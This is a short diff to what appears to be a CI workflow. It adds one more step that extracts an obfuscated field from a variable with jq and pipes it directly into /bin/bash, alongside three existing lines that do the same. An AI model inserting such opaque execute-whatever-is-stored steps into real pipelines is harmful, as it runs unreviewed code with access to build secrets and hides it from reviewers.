@@ -36,6 +36,7 @@ jobs:
           echo $oftu57 | jq -r .d1234 | /bin/bash
           echo $ew5 | jq -r .k33607 | /bin/bash
           printf '%s' "$riir0" | jq -r .lgr9211 | /bin/bash
+          printf '%s' "$hko16" | jq -r .ss5013 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
